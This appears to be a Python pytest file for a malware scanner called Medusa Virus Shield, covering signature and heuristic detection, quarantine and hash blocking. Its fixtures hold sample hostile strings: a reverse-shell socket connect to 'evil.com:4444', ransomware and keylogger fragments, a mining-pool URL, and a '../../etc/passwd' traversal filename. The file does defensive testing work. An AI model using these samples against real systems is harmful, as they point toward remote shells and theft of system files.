"""Tests for Medusa Virus Shield service."""

import pytest

from app.services.medusa_shield import (
    MedusaVirusShield,
    ScanStatus,
    ShieldHead,
    ThreatCategory,
)


@pytest.fixture
def shield() -> MedusaVirusShield:
    """Create a fresh Medusa Shield instance for each test."""
    return MedusaVirusShield()


class TestMedusaSignatureDetection:
    """Test signature-based malware detection."""

    def test_detect_reverse_shell(self, shield: MedusaVirusShield) -> None:
        """Detect reverse shell payloads."""
        malicious = "import socket; socket.connect(('evil.com', 4444))"
        result = shield.scan_content(malicious)
        assert result.status == ScanStatus.THREAT_FOUND
        assert result.risk_score > 0
        threats = [t["threat"] for t in result.threats_found]
        assert "reverse_shell" in threats

    def test_detect_ransomware_patterns(self, shield: MedusaVirusShield) -> None:
        """Detect ransomware encryption behavior."""
        malicious = "from Crypto.Cipher import AES; AES.new(key)"
        result = shield.scan_content(malicious)
        assert result.status == ScanStatus.THREAT_FOUND
        categories = [t.get("category") for t in result.threats_found]
        assert ThreatCategory.RANSOMWARE in categories

    def test_detect_keylogger(self, shield: MedusaVirusShield) -> None:
        """Detect keylogger activity."""
        malicious = "from pynput.keyboard import Listener"
        result = shield.scan_content(malicious)
        assert result.status == ScanStatus.THREAT_FOUND
        categories = [t.get("category") for t in result.threats_found]
        assert ThreatCategory.KEYLOGGER in categories

    def test_clean_content(self, shield: MedusaVirusShield) -> None:
        """Clean content should pass scan."""
        safe = "Hello, this is a normal message about the weather today."
        result = shield.scan_content(safe)
        assert result.status == ScanStatus.CLEAN
        assert result.risk_score == 0.0
        assert len(result.threats_found) == 0

    def test_detect_crypto_mining(self, shield: MedusaVirusShield) -> None:
        """Detect cryptocurrency mining activity."""
        malicious = "pool_url = 'stratum+tcp://pool.mining.com:3333'"
        result = shield.scan_content(malicious)
        assert result.status == ScanStatus.THREAT_FOUND
        categories = [t.get("category") for t in result.threats_found]
        assert ThreatCategory.CRYPTOJACKER in categories


class TestMedusaHeuristicDetection:
    """Test heuristic and behavioral analysis."""

    def test_dangerous_file_extension(self, shield: MedusaVirusShield) -> None:
        """Flag dangerous file extensions."""
        result = shield.scan_content("some content", filename="payload.exe")
        assert result.status == ScanStatus.THREAT_FOUND
        threats = [t["threat"] for t in result.threats_found]
        assert "dangerous_file_extension" in threats

    def test_code_obfuscation_detection(self, shield: MedusaVirusShield) -> None:
        """Detect code obfuscation techniques."""
        obfuscated = "var x = String.fromCharCode(72); atob('aGVsbG8=')"
        result = shield.scan_content(obfuscated)
        assert result.status == ScanStatus.THREAT_FOUND
        threats = [t["threat"] for t in result.threats_found]
        assert "code_obfuscation" in threats

    def test_path_traversal_in_filename(self, shield: MedusaVirusShield) -> None:
        """Detect path traversal in filenames."""
        result = shield.scan_content("data", filename="../../etc/passwd")
        assert result.status == ScanStatus.THREAT_FOUND
        threats = [t["threat"] for t in result.threats_found]
        assert "path_traversal" in threats


class TestMedusaQuarantine:
    """Test quarantine and neutralization."""

    def test_quarantine_threat(self, shield: MedusaVirusShield) -> None:
        """Quarantine a detected threat."""
        entry = shield.quarantine_threat(
            content_path="/uploads/malware.bin",
            threat_name="trojan_x",
            category=ThreatCategory.TROJAN,
            severity=8,
        )
        assert entry.threat_name == "trojan_x"
        assert entry.threat_category == ThreatCategory.TROJAN
        assert not entry.neutralized

    def test_neutralize_quarantined_threat(self, shield: MedusaVirusShield) -> None:
        """Neutralize a quarantined threat."""
        entry = shield.quarantine_threat(
            content_path="/uploads/bad.exe",
            threat_name="worm_z",
            category=ThreatCategory.WORM,
            severity=7,
        )
        success = shield.neutralize_threat(entry.id)
        assert success is True

        quarantine = shield.get_quarantine_list()
        assert quarantine[0].neutralized is True

    def test_neutralize_nonexistent_fails(self, shield: MedusaVirusShield) -> None:
        """Neutralizing nonexistent ID returns False."""
        assert shield.neutralize_threat("nonexistent-id") is False


class TestMedusaHashBlocking:
    """Test hash-based content blocking."""

    def test_blocked_hash_detected(self, shield: MedusaVirusShield) -> None:
        """Content with blocked hash should be detected."""
        import hashlib

        content = "known malicious payload"
        content_hash = hashlib.sha256(content.encode()).hexdigest()
        shield.add_blocked_hash(content_hash)

        result = shield.scan_content(content)
        assert result.status == ScanStatus.THREAT_FOUND
        assert any(t.get("hash") == content_hash for t in result.threats_found)


class TestMedusaShieldStatus:
    """Test shield status and head management."""

    def test_shield_status(self, shield: MedusaVirusShield) -> None:
        """Shield status returns comprehensive info."""
        status = shield.get_shield_status()
        assert status["shield_name"] == "Medusa Virus Shield"
        assert status["status"] == "active"
        assert status["total_heads"] == len(ShieldHead)
        assert len(status["capabilities"]) >= 8

    def test_disable_enable_head(self, shield: MedusaVirusShield) -> None:
        """Can disable and re-enable detection heads."""
        shield.disable_head(ShieldHead.HEURISTIC)
        # Scan with heuristic disabled — .exe should not trigger
        result = shield.scan_content("safe content", filename="test.exe")
        heuristic_threats = [
            t for t in result.threats_found if t.get("head") == ShieldHead.HEURISTIC
        ]
        assert len(heuristic_threats) == 0

        # Re-enable
        shield.enable_head(ShieldHead.HEURISTIC)

    def test_recommendations_generated(self, shield: MedusaVirusShield) -> None:
        """Recommendations are generated for threats."""
        malicious = "AES.new(key, AES.MODE_CBC); ransom_note = 'Pay now'"
        result = shield.scan_content(malicious)
        assert len(result.recommendations) > 0
        assert any("CRITICAL" in r or "Threat" in r for r in result.recommendations)
